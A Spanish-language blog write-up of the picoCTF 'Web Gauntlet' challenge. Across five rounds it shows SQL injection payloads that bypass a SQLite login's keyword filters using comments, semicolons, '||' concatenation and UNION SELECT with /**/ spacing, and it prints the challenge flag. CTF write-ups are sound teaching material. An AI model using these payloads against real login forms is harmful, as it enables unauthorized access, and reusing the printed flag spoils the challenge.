---
layout: post
title: picoCTF web gauntlet - sql injection y evadiendo filtros
author: c4rta
date: 2023-01-04
##categories: [Desafios Web]
tags: [SQL injection]
image: /assets/img/web-gaunlet/waifu.jpg
---
En este desafio explotaremos un SQLi donde hay que evadir un par de filtros para conseguir la flag

{:.lead}

Para este desafio tenemos que hacer bypass de varios filtros usando sql injection, el SGBD es sqlite y el usuario para todos los casos es ```admin```

```http://jupiter.challenges.picoctf.org:41560/``` --> Pagina vulnerable

```http://jupiter.challenges.picoctf.org:41560/filter.php``` --> Filtro de cada round

## Round 1

El primer filtro de debemos de evadir es ```or```, al llenar los campos y presionar en ```sign in``` vemos como nos muestra la consulta, la cual es:

```SELECT * FROM users WHERE username='admin' AND password='admin'```


Aun que no hayamos conseguido iniciar, podemos ver que se esta usando el operador ```AND```, y ```AND``` permite usar multiples condiciones en un ```WHERE```, al usar ```AND```, se asume que que toda la condicion es verdadera, cuando cada condicion sea verdadera.

Ademas debemos de evadir ```OR```, que lo que hace es combinar varias condiciones en un ```WHERE```, y al usarlo se asume que la condicion completa es verdadera cuando cualquiera de las condiciones sea verdadera.

Asi que como sabemos que el usuario debe ser ```admin```, lo que podemos hacer es escapar la consulta desde el ```AND``` para que toda la condicion sea verdadera y asi se cumpliria la condicion ```AND``` ya que ahora la contraseña es igual a lo que le pasemos como input, ```0R``` ya que esta cumpliendo una condicion que es que el usuario sea ```admin``` y ademas omitimos la contraseña, esto lo hacemos comentando desde ```AND```, y queda algo asi:

usuario: ```admin'--```
contra: --> esto puede ser lo que sea


### Round 2

En este round no podemos usar ```OR``` y ```--```, pero realmente es lo mismo que el anterior, ya que en sqlite hay dos tipos de comentario, uno es ```--``` y otro es ```/*``` (la explicacion es la misma).

usuario: ```admin' /*```

Y otra manera de solucionarlo es acortar la consulta, esto para que solo haya una condicion, es decir que el usuario sea admin, la consulta queda asi

```SELECT * FROM users WHERE username='admin';```

Y el input queda asi:

usuario: ```admin;```


### Round 3

Ahora no podemos usar ```OR```, espacios y ```--```, pero esto no importa ya que aun podemos acortar la consulta como en el round pasado y todo queda igual, asi:

```SELECT * FROM users WHERE username='admin';```

El input queda asi:

usuario: ```admin';```

## Round 4

Ahora no podemos usar ```OR```, espacios, ```--``` y la palabra ```admin```.

La manera mas evidente de resolverlo es separar la palabra admin y luego concaternarla, esto lo podemos hacer con ```||``` y luego comentar todo lo demas, de esta manera:

```SELECT * FROM users WHERE username='adm'||'in'/*```

Y como input le podemos pasar esto

```adm'||'in'/*```

Otra manera de resolverlo es usando el operador ```UNION``` y la consulta quedaria algo asi:

```SELECT * FROM users WHERE username='c4rta'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;```

Esto hace dos consultas, la primera es:

```SELECT * FROM users WHERE username='c4rta'```

Y la segunda:

```SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;```

```UNION``` combina los SELECT, ```/**/``` entre todas las palabras representan los espacios en blanco. Y tenemos que incluir la parte LIMIT 1 porque generalmente en una base de datos, el administrador es la primera entrada de la tabla y con esta consulta, simplemente recuperamos la primera línea, que en este caso es el administrador, entonces nuestro input queda:


usuario: ```c4rta'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;```

## Round 5

Aun que ahora ya no podemos usar el ```UNION``` y todos los demas filtros anteriores, podemos separar la palabra ```admin``` y luego concatenarla, osea que podemos usar uno de los payloads de round 4 y entonces queda asi:

usuario: ```adm'||'in'/*```

Y la flag es: ```picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}```

Eso ha sido todo, gracias por leer ❤
